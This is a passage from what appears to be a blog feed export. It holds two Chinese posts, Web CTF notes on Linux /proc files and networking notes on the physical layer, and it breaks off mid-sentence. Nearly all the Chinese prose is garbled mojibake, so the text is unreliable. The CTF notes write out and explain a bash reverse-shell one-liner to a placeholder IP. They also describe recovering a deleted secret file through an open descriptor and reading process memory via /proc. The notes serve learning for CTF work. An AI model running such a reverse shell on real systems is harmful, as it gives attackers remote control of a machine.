src="http://cdn.clown2024.cn/202407151443729.png" alt="image-20240310233618051"></p><blockquote><p><strong>åœ¨ linux ç³»ç»Ÿä¸­ï¼Œå¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></p></blockquote><p>bashåå¼¹shellå‘½ä»¤çš„ç¼–å†™ä¹Ÿå’Œfdæœ‰å…³ï¼Œç°åœ¨æ‹¿åå¼¹shellçš„å‘½ä»¤æ¥è§£æä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/85712">https://www.anquanke.com/post/id/85712</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><blockquote><p>bash -iå°±æ˜¯æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„bash</p><p> &#x2F;dev&#x2F;tcp&#x2F;æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œè¯»å†™è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚åŒç†ï¼ŒLinuxä¸­è¿˜å­˜åœ¨&#x2F;dev&#x2F;udp&#x2F;ã€‚</p></blockquote><p>é‡ç‚¹å°±æ˜¯è¿™ä¸ª**&gt;&amp;**æ˜¯ä»€ä¹ˆæ„æ€</p><p>å…ˆæ¥äº†è§£ä¸€ä¸‹Linuxä¸­å¸¸ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼š</p><ul><li>æ ‡å‡†è¾“å…¥(stdin)ï¼šä»£ç ä¸º0ï¼Œæ˜ å°„å…³ç³»ï¼š&#x2F;dev&#x2F;stdin -&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;0 </li><li>æ ‡å‡†è¾“å‡º(stdout)ï¼šä»£ç ä¸º1ï¼Œæ˜ å°„å…³ç³»ï¼š&#x2F;dev&#x2F;stdout-&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;1</li><li>æ ‡å‡†é”™è¯¯è¾“å‡º(stderr)ï¼šä»£ç ä¸º2ï¼Œæ˜ å°„å…³ç³»ï¼š&#x2F;dev&#x2F;stderr -&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;2</li></ul><p><img src="http://cdn.clown2024.cn/202407151443730.png" alt="image-20240406232216675"></p><p><code>&gt;&amp;</code> æ˜¯ä¸€ä¸ªé‡å®šå‘æ“ä½œç¬¦ï¼Œå®ƒç”¨äºå°†æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰é‡å®šå‘åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ–æ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¸ªç¬¦å·å’Œ<code>&amp;&gt;</code>éƒ½æ˜¯ä¸€ä¸ªæ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸Šé¢çš„åå¼¹shellå‘½ä»¤æ¢æˆè¿™ç§ç¬¦å·ä¹Ÿæ²¡å…³ç³»ã€‚</p><p>ä¾‹å¦‚<code>2&gt;&amp;1</code>å°±æ˜¯å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¿™ä¸¤ä¸ªæµåˆä¸ºä¸€æ¡æµäº†ï¼ŒæŠ¥é”™å’Œæ²¡æŠ¥é”™çš„ä¿¡æ¯éƒ½ä¼šæ˜¾ç¤ºå‡ºæ¥</p><p>è€Œ<code>&gt;&amp;</code>åé¢æ¥æ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä»£è¡¨å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶</p><p>è€Œåœ¨åé¢åŠ ä¸Š0&gt;&amp;1å°±æ˜¯å°†æ ‡å‡†è¾“å…¥é‡å®šå‘è‡³æ ‡å‡†è¾“å‡ºï¼Œè€Œè¿™é‡Œæ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘è‡³è¿œç¨‹äº†ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ ‡å‡†è¾“å…¥ä¹Ÿé‡å®šå‘è‡³è¿œç¨‹ï¼Œè¿™å°±ä¿è¯äº†æ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œéƒ½åœ¨è¿™ä¸ªtcpè¿æ¥é‡Œé¢è¿›è¡Œã€‚</p><p>é‡å®šå‘ç¬¦çš„æ„ä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&gt; å’Œ &lt; åˆ†åˆ«ä»£è¡¨é‡å®šå‘æ–¹å‘<br>&gt;&gt; å’Œ &lt;&lt; åˆ†åˆ«ä»£è¡¨è¿½åŠ <br>2&gt; å’Œ 2&gt;&gt; å°±æ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºçš„ä½¿ç”¨<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ•´ä¸ªæŒ‡ä»¤çš„å¤§æ¦‚åŸç†å°±æ˜¯åˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„shellåˆ©ç”¨&gt;&amp;é‡å®šå‘è‡³tcpè¿æ¥ï¼Œç„¶å0&gt;&amp;1å°†æ–‡ä»¶æè¿°ç¬¦ 0ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦ 1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯å°†è¾“å…¥å’Œè¾“å‡ºåˆå¹¶ä¸ºä¸€ä¸ªæµã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ç¡®ä¿å‘½ä»¤çš„è¾“å…¥å’Œè¾“å‡ºéƒ½é€šè¿‡ç½‘ç»œå¥—æ¥å­—è¿›è¡Œäº¤äº’ã€‚</p><p>ç»¼åˆèµ·æ¥ï¼Œè¯¥å‘½ä»¤çš„ç›®çš„æ˜¯å°† Bash çš„æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°æŒ‡å®šçš„ç½‘ç»œå¥—æ¥å­—ã€‚</p><h2 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h2><p>mapsæ–‡ä»¶æä¾›äº†æœ‰å…³å½“å‰è¿›ç¨‹åœ°å€ç©ºé—´ä¸­å†…å­˜æ˜ å°„çš„ä¿¡æ¯ã€‚ä½ å¯ä»¥çœ‹åˆ°åŒ…å«å½“å‰è¿›ç¨‹åœ°å€ç©ºé—´ä¸­æ‰€æœ‰å·²æ˜ å°„å†…å­˜åŒºåŸŸï¼ˆå¦‚ä»£ç æ®µã€æ•°æ®æ®µã€å †ã€æ ˆç­‰ï¼‰çš„è¯¦ç»†ä¿¡æ¯ã€‚æ¯ä¸€è¡Œè¡¨ç¤ºä¸€ä¸ªå†…å­˜åŒºåŸŸï¼Œå…¶ä¸­åŒ…å«äº†è¯¥åŒºåŸŸçš„èµ·å§‹åœ°å€ã€ç»“æŸåœ°å€ã€è®¿é—®æƒé™ç­‰ä¿¡æ¯ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/maps<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443731.png" alt="image-20240310234519798"></p><blockquote><p>ä¸Šé¢çš„ä¿¡æ¯ä¾æ¬¡å¦‚ä¸‹ï¼š</p><p>èµ·å§‹åœ°å€-ç»“æŸåœ°å€ æƒé™ åç§»é‡ è®¾å¤‡å· èŠ‚ç‚¹å· æ–‡ä»¶å</p></blockquote><h2 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h2><p>&#x2F;proc&#x2F;self&#x2F;mem æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œå®ƒä»£è¡¨å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„ã€‚é€šè¿‡å¯¹è¯¥æ–‡ä»¶è¿›è¡Œè¯»å–å’Œå†™å…¥æ“ä½œï¼Œå¯ä»¥è¯»å–å’Œä¿®æ”¹å½“å‰è¿›ç¨‹çš„ç‰©ç†å†…å­˜ã€‚å®ƒç”¨äºå¯¹è¿›ç¨‹çš„å†…å­˜è¿›è¡Œè¯»å†™æ“ä½œï¼Œé€šå¸¸ç”¨äºè°ƒè¯•å’Œåˆ†æå·¥å…·ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/mem<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443732.png" alt="image-20240310235303267"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œå­¦ä¹ -6</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/</url>
      
        <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#%E7%89%A9%E7%90%86%E5%B1%82%E6%A6%82%E8%BF%B0">ç‰©ç†å±‚æ¦‚è¿°</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1">æ•°æ®é€šä¿¡</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E6%A8%A1%E5%9E%8B">æ•°æ®é€šä¿¡æ¨¡å‹</a></li><li><a href="#%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD">ç›¸å…³æœ¯è¯­</a></li><li><a href="#%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F">é€šä¿¡æ–¹å¼</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%96%B9%E5%BC%8F">æ•°æ®ä¼ è¾“æ–¹å¼</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD">æ•°æ®ä¼ è¾“ç›¸å…³æœ¯è¯­</a></li></ul></li><li><a href="#%E5%A5%88%E6%B0%8F%E5%87%86%E5%88%99">å¥ˆæ°å‡†åˆ™</a><ul><li><a href="#%E5%A4%B1%E7%9C%9F">å¤±çœŸ</a></li><li><a href="#%E5%A5%88%E6%B0%8F%E5%87%86%E5%88%99%E5%A5%88%E5%A5%8E%E6%96%AF%E7%89%B9%E5%AE%9A%E7%90%86">å¥ˆæ°å‡†åˆ™(å¥ˆå¥æ–¯ç‰¹å®šç†)</a></li></ul></li><li><a href="#%E9%A6%99%E5%86%9C%E5%AE%9A%E7%90%86">é¦™å†œå®šç†</a><ul><li><a href="#%E5%A5%88%E5%BC%8F%E5%92%8C%E9%A6%99%E5%86%9C%E7%9A%84%E5%AF%B9%E6%AF%94">å¥ˆå¼å’Œé¦™å†œçš„å¯¹æ¯”</a></li></ul></li><li><a href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6">ç¼–ç ä¸è°ƒåˆ¶</a><ul><li><a href="#%E5%9F%BA%E5%B8%A6%E4%BF%A1%E5%8F%B7%E4%B8%8E%E5%AE%BD%E5%B8%A6%E4%BF%A1%E5%8F%B7">åŸºå¸¦ä¿¡å·ä¸å®½å¸¦ä¿¡å·</a></li><li><a href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6%E7%9A%84%E5%8C%BA%E5%88%86">ç¼–ç ä¸è°ƒåˆ¶çš„åŒºåˆ†</a></li><li><a href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6%E7%9A%84%E5%85%B7%E4%BD%93%E6%96%B9%E5%BC%8F">ç¼–ç ä¸è°ƒåˆ¶çš„å…·ä½“æ–¹å¼</a><ul><li><a href="#%E6%95%B0%E5%AD%97%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B8%BA%E6%95%B0%E5%AD%97%E4%BF%A1%E5%8F%B7">æ•°å­—æ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·</a></li><li><a href="#%E6%95%B0%E5%AD%97%E6%95%B0%E6%8D%AE%E8%B0%83%E5%88%B6%E4%B8%BA%E6%A8%A1%E6%8B%9F%E4%BF%A1%E5%8F%B7">æ•°å­—æ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·</a></li><li><a href="#%E6%A8%A1%E6%8B%9F%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B8%BA%E6%95%B0%E5%AD%97%E4%BF%A1%E5%8F%B7">æ¨¡æ‹Ÿæ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·</a></li><li><a href="#%E6%A8%A1%E6%8B%9F%E6%95%B0%E6%8D%AE%E8%B0%83%E5%88%B6%E4%B8%BA%E6%A8%A1%E6%8B%9F%E4%BF%A1%E5%8F%B7">æ¨¡æ‹Ÿæ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·</a></li></ul></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2%E6%96%B9%E5%BC%8F">æ•°æ®äº¤æ¢æ–¹å¼</a><ul><li><a href="#%E7%94%B5%E8%B7%AF%E4%BA%A4%E6%8D%A2circuit-exchanging">ç”µè·¯äº¤æ¢(Circuit Exchanging)</a></li><li><a href="#%E6%8A%A5%E6%96%87%E4%BA%A4%E6%8D%A2message-exchanging">æŠ¥æ–‡äº¤æ¢(Message Exchanging)</a></li><li><a href="#%E5%88%86%E7%BB%84%E4%BA%A4%E6%8D%A2packet-exchanging">åˆ†ç»„äº¤æ¢(Packet Exchanging)</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E6%8A%A5%E6%96%B9%E5%BC%8F">æ•°æ®æŠ¥æ–¹å¼</a></li><li><a href="#%E8%99%9A%E7%94%B5%E8%B7%AF%E6%96%B9%E5%BC%8F">è™šç”µè·¯æ–¹å¼</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%92%8C%E8%99%9A%E7%94%B5%E8%B7%AF%E5%AF%B9%E6%AF%94">æ•°æ®æŠ¥å’Œè™šç”µè·¯å¯¹æ¯”</a></li></ul></li><li><a href="#%E4%BA%A4%E6%8D%A2%E6%96%B9%E5%BC%8F%E7%9A%84%E9%80%89%E6%8B%A9">äº¤æ¢æ–¹å¼çš„é€‰æ‹©</a></li></ul></li><li><a href="#%E7%89%A9%E7%90%86%E5%B1%82%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8">ç‰©ç†å±‚ä¼ è¾“ä»‹è´¨</a><ul><li><a href="#%E5%AF%BC%E5%90%91%E5%9E%8B%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8">å¯¼å‘å‹ä¼ è¾“ä»‹è´¨</a><ul><li><a href="#%E5%8F%8C%E7%BB%9E%E7%BA%BF">åŒç»çº¿</a></li><li><a href="#%E5%90%8C%E8%BD%B4%E7%94%B5%E7%BC%86">åŒè½´ç”µç¼†</a></li><li><a href="#%E5%85%89%E7%BA%A4">å…‰çº¤</a></li></ul></li><li><a href="#%E9%9D%9E%E5%AF%BC%E5%90%91%E5%9E%8B%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8">éå¯¼å‘å‹ä¼ è¾“ä»‹è´¨</a></li></ul></li><li><a href="#%E7%89%A9%E7%90%86%E5%B1%82%E8%AE%BE%E5%A4%87">ç‰©ç†å±‚è®¾å¤‡</a><ul><li><a href="#%E4%B8%AD%E7%BB%A7%E5%99%A8">ä¸­ç»§å™¨</a></li><li><a href="#%E9%9B%86%E7%BA%BF%E5%99%A8%E5%A4%9A%E5%8F%A3%E4%B8%AD%E7%BB%A7%E5%99%A8">é›†çº¿å™¨(å¤šå£ä¸­ç»§å™¨)</a></li></ul></li></ul><!-- tocstop --><h1 id="ç‰©ç†å±‚æ¦‚è¿°"><a href="#ç‰©ç†å±‚æ¦‚è¿°" class="headerlink" title="ç‰©ç†å±‚æ¦‚è¿°"></a>ç‰©ç†å±‚æ¦‚è¿°</h1><p>å¯¼å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151636393.png" alt="image-20240311085938464"></p><p>ç‰©ç†å±‚è§£å†³å¦‚ä½•åœ¨è¿æ¥å„ç§è®¡ç®—æœºçš„ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµï¼Œè€Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚</p><p><strong>ç‰©ç†å±‚ä¸»è¦ä»»åŠ¡ï¼š</strong>ç¡®å®šä¸ä¼ è¾“åª’ä½“æ¥å£æœ‰å…³çš„ä¸€äº›ç‰¹æ€§</p><p><strong>ç‰©ç†å±‚ç‰¹æ€§</strong></p><ol><li>æœºæ¢°ç‰¹æ€§ï¼šå®šä¹‰ç‰©ç†è¿æ¥çš„ç‰¹æ€§ï¼Œè§„å®šç‰©ç†è¿æ¥æ—¶æ‰€é‡‡ç”¨çš„è§„æ ¼ã€æ¥å£å½¢çŠ¶ã€å¼•çº¿æ•°ç›®ã€å¼•è„šæ•°é‡å’Œæ’åˆ—æƒ…å†µã€‚</li><li>ç”µæ°”ç‰¹æ€§ï¼šè§„å®šä¼ è¾“äºŒè¿›åˆ¶ä½æ—¶ï¼Œçº¿è·¯ä¸Šä¿¡å·çš„ç”µå‹èŒƒå›´ã€é˜»æŠ—åŒ¹é…ã€ä¼ è¾“é€Ÿç‡å’Œè·ç¦»é™åˆ¶ç­‰ã€‚</li><li>åŠŸèƒ½ç‰¹æ€§ï¼šæŒ‡æ˜æŸæ¡çº¿ä¸Šå‡ºç°çš„æŸä¸€ç”µå¹³è¡¨ç¤ºä½•ç§æ„ä¹‰ï¼Œæ¥å£éƒ¨ä»¶çš„ä¿¡å·çº¿çš„ç”¨é€”ã€‚</li><li>è§„ç¨‹ç‰¹æ€§ï¼š(è¿‡ç¨‹ç‰¹æ€§)å®šä¹‰å„æ¡ç‰©ç†çº¿è·¯çš„å·¥ä½œè§„ç¨‹å’Œæ—¶åºå…³ç³»ã€‚</li></ol><h1 id="æ•°æ®é€šä¿¡"><a href="#æ•°æ®é€šä¿¡" class="headerlink" title="æ•°æ®é€šä¿¡"></a>æ•°æ®é€šä¿¡</h1><h2 id="æ•°æ®é€šä¿¡æ¨¡å‹"><a href="#æ•°æ®é€šä¿¡æ¨¡å‹" class="headerlink" title="æ•°æ®é€šä¿¡æ¨¡å‹"></a>æ•°æ®é€šä¿¡æ¨¡å‹</h2><p><img src="http://cdn.clown2024.cn/202407151636394.png" alt="image-20240311133036272"></p><p><strong>æ•°å­—ä¿¡å·å’Œæ¨¡æ‹Ÿä¿¡å·</strong></p><p>è¿™ä¸¤ç§ä¿¡å·çš„æœ€ä¸»è¦åŒºåˆ«å°±æ˜¯ï¼šæ•°å­—ä¿¡å·æ˜¯ç¦»æ•£çš„ï¼Œè€Œæ¨¡æ‹Ÿä¿¡å·æ˜¯è¿ç»­çš„ã€‚</p><p>æ•°å­—ä¿¡å·æ˜¯æ•°å­—åŒ–çš„ï¼Œåœ¨è®¡ç®—æœºä¸­ï¼ŒCPUåªè®¤è¯†â€œ0â€å’Œâ€œ1â€ä¸¤ä¸ªæ•°å­—ï¼Œæ‰€ä»¥æ•°å­—ä¿¡å·éœ€è¦ç”±â€œ0â€å’Œâ€œ1â€æ„æˆçš„äºŒåˆ¶æ•°æ¥è¡¨ç¤º;è€Œæ‘¸æ‹Ÿä¿¡å·åˆ™æ˜¯è¿ç»­å˜åŒ–çš„ç‰©ç†é‡ï¼Œå®ƒçš„é¢‘ç‡ã€å¹…åº¦ã€ç›¸ä½éƒ½å¯ä»¥éšç€æ—¶é—´è¿ç»­çš„å˜åŒ–ã€‚</p><p><strong>æ¨¡æ‹Ÿä¿¡å·ï¼š</strong>æ˜¯æŒ‡ä¿¡æ¯å‚æ•°åœ¨ç»™å®šèŒƒå›´å†…è¡¨ç°ä¸ºè¿ç»­çš„ä¿¡å·ã€‚æˆ–åœ¨ä¸€æ®µè¿ç»­çš„æ—¶é—´é—´éš”å†…ï¼Œå…¶ä»£è¡¨ä¿¡æ¯çš„ç‰¹å¾é‡å¯ä»¥åœ¨ä»»æ„ç¬é—´å‘ˆç°ä¸ºä»»æ„æ•°å€¼çš„ä¿¡å·ã€‚å…¶åˆ†å¸ƒäºè‡ªç„¶ç•Œçš„å„ä¸ªè§’è½ï¼Œå¦‚æ¯å¤©çš„æ¸©åº¦å˜åŒ–ï¼Œè¿ç»­çš„å±±å³°ã€‚</p><p><strong>æ•°å­—ä¿¡å·ï¼š</strong>æ˜¯æŒ‡äººä»¬æŠ½è±¡å‡ºæ¥çš„æ—¶é—´ä¸Šä¸è¿ç»­çš„ä¿¡å·ï¼Œå…¶å¹…åº¦çš„å–å€¼æ˜¯ç¦»æ•£çš„ï¼Œä¸”å¹…å€¼è¢«é™åˆ¶åœ¨æœ‰é™ä¸ªæ•°å€¼ä¹‹å†…ã€‚<br>ä¾‹å¦‚äºŒè¿›åˆ¶ç å°±æ˜¯ä¸€ç§æ•°å­—ä¿¡å·ã€‚</p><h2 id="ç›¸å…³æœ¯è¯­"><a href="#ç›¸å…³æœ¯è¯­" class="headerlink" title="ç›¸å…³æœ¯è¯­"></a>ç›¸å…³æœ¯è¯­</h2><p>æ•°æ®é€šä¿¡æŒ‡åœ¨ä¸åŒè®¡ç®—æœºä¹‹é—´ä¼ è¾“è¡¨ç¤ºä¿¡æ¯çš„äºŒè¿›åˆ¶æ•°0ã€1åºåˆ—çš„è¿‡ç¨‹ã€‚</p><ul><li><p><strong>æ•°æ®dataï¼š</strong>ä¼ é€ä¿¡æ¯çš„å®ä½“ï¼Œé€šå¸¸æ˜¯æœ‰æ„ä¹‰çš„ç¬¦å·åºåˆ—ã€‚</p></li><li><p><strong>ä¿¡å·ï¼š</strong>æ•°æ®çš„ç”µæ°”&#x2F;ç”µç£çš„è¡¨ç°ï¼Œæ˜¯æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„å­˜åœ¨å½¢å¼ã€‚</p></li><li><p><strong>ä¿¡æºï¼š</strong>äº§ç”Ÿå’Œå‘é€æ•°æ®çš„æºå¤´ã€‚</p></li><li><p><strong>ä¿¡å®¿ï¼š</strong>æ¥æ”¶æ•°æ®çš„ç»ˆç‚¹ã€‚</p></li><li><p><strong>ä¿¡é“ï¼š</strong>ä¿¡å·çš„ä¼ è¾“åª’ä»‹ã€‚ä¸€èˆ¬ç”¨æ¥è¡¨ç¤ºå‘æŸä¸€ä¸ªæ–¹å‘ä¼ é€ä¿¡æ¯çš„ä»‹è´¨ï¼Œå› æ­¤ä¸€æ¡é€šä¿¡çº¿è·¯å¾€å¾€åŒ…å«ä¸€æ¡å‘é€ä¿¡é“å’Œä¸€æ¡æ¥æ”¶ä¿¡é“ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636395.png" alt="image-20240311133924072"></p></li></ul><h2 id="é€šä¿¡æ–¹å¼"><a href="#é€šä¿¡æ–¹å¼" class="headerlink" title="é€šä¿¡æ–¹å¼"></a>é€šä¿¡æ–¹å¼</h2><ol><li><p>å•å·¥é€šä¿¡</p><p>åªæœ‰ä¸€ä¸ªæ–¹å‘çš„é€šä¿¡è€Œæ²¡æœ‰åæ–¹å‘çš„äº¤äº’ï¼Œä»…éœ€è¦ä¸€æ¡ä¿¡é“ã€‚</p></li><li><p>åŠåŒå·¥é€šä¿¡&#x2F;åŒå‘äº¤æ›¿é€šä¿¡</p><p>é€šä¿¡çš„åŒæ–¹éƒ½å¯ä»¥å‘é€æˆ–æ¥æ”¶ä¿¡æ¯ï¼Œä½†ä»»ä½•ä¸€æ–¹éƒ½ä¸èƒ½åŒæ—¶å‘é€å’Œæ¥æ”¶éœ€è¦ä¸¤æ¡ä¿¡é“ã€‚</p></li><li><p>å…¨åŒå·¥åŒä¿¡&#x2F;åŒå‘åŒæ—¶é€šä¿¡</p><p>é€šä¿¡åŒæ–¹å¯ä»¥åŒæ—¶å‘é€å’Œæ¥å—ä¿¡æ¯ï¼Œä¹Ÿéœ€è¦ä¸¤æ¡ä¿¡é“ã€‚</p></li></ol><h2 id="æ•°æ®ä¼ è¾“æ–¹å¼"><a href="#æ•°æ®ä¼ è¾“æ–¹å¼" class="headerlink" title="æ•°æ®ä¼ è¾“æ–¹å¼"></a>æ•°æ®ä¼ è¾“æ–¹å¼</h2><ul><li>ä¸²è¡Œä¼ è¾“å’Œå¹¶è¡Œå’Œä¼ è¾“</li></ul><p><img src="http://cdn.clown2024.cn/202407151636396.png" alt="image-20240311134306251"></p><ul><li>åŒæ­¥ä¼ è¾“å’Œå¼‚æ­¥ä¼ è¾“</li></ul><p><strong>åŒæ­¥ä¼ è¾“ï¼š</strong>åœ¨åŒæ­¥ä¼ è¾“çš„æ¨¡å¼ä¸‹ï¼Œæ•°æ®çš„ä¼ é€æ˜¯ä»¥ä¸€ä¸ªæ•°æ®åŒºå—ä¸ºå•ä½ï¼Œå› æ­¤åŒæ­¥ä¼ è¾“åˆç§°ä¸ºåŒºå—ä¼ è¾“ã€‚<br>åœ¨ä¼ é€æ•°æ®æ—¶ï¼Œéœ€å…ˆé€å‡º1ä¸ªæˆ–å¤šä¸ªåŒæ­¥å­—ç¬¦ï¼Œå†é€å‡ºæ•´æ‰¹çš„æ•°æ®ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636397.png" alt="image-20240311164351449"></p><p><strong>å¼‚æ­¥ä¼ è¾“ï¼š</strong></p><p>å¼‚æ­¥ä¼ è¾“å°†æ¯”ç‰¹åˆ†æˆå°ç»„è¿›è¡Œä¼ é€ï¼Œå°ç»„å¯ä»¥æ˜¯8ä½çš„1ä¸ªå­—ç¬¦æˆ–æ›´é•¿ã€‚å‘é€æ–¹å¯ä»¥åœ¨ä»»ä½•æ—¶åˆ»å‘é€è¿™äº›æ¯”ç‰¹ç»„ï¼Œè€Œæ¥æ”¶æ–¹ä¸çŸ¥é“å®ƒä»¬ä¼šåœ¨ä»€ä¹ˆæ—¶å€™åˆ°è¾¾ã€‚ä¼ é€æ•°æ®æ—¶ï¼ŒåŠ ä¸€ä¸ªå­—ç¬¦èµ·å§‹ä½å’Œä¸€ä¸ªå­—ç¬¦ç»ˆæ­¢ä½ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636398.png" alt="image-20240311164401203"></p><h2 id="æ•°æ®ä¼ è¾“ç›¸å…³æœ¯è¯­"><a href="#æ•°æ®ä¼ è¾“ç›¸å…³æœ¯è¯­" class="headerlink" title="æ•°æ®ä¼ è¾“ç›¸å…³æœ¯è¯­"></a>æ•°æ®ä¼ è¾“ç›¸å…³æœ¯è¯­</h2><ul><li><p>ç å…ƒï¼šç å…ƒæ˜¯æŒ‡ç”¨ä¸€ä¸ªå›ºå®šæ—¶é•¿çš„ä¿¡å·æ³¢å½¢_(æ•°å­—è„‰å†²)ï¼Œä»£è¡¨ä¸åŒç¦»æ•£æ•°å€¼çš„åŸºæœ¬æ³¢å½¢ï¼Œæ˜¯æ•°å­—é€šä¿¡ä¸­æ•°å­—ä¿¡å·çš„è®¡é‡å•ä½ï¼Œè¿™ä¸ªæ—¶é•¿å†…çš„ä¿¡å·ç§°ä¸ºkè¿›åˆ¶ç å…ƒï¼Œè€Œè¯¥æ—¶é•¿ç§°ä¸ºç å…ƒå®½åº¦ã€‚å½“ç å…ƒçš„ç¦»æ•£çŠ¶æ€æœ‰Mä¸ªæ—¶(Må¤§äº2)ï¼Œæ­¤æ—¶ç å…ƒä¸ºMè¿›åˆ¶ç å…ƒã€‚</p><p>1ç å…ƒå¯ä»¥æºå¸¦å¤šä¸ªæ¯”ç‰¹çš„ä¿¡æ¯é‡ã€‚ä¾‹å¦‚ï¼Œåœ¨ä½¿ç”¨äºŒè¿›åˆ¶ç¼–ç æ—¶ï¼Œåªæœ‰ä¸¤ç§ä¸åŒçš„ç 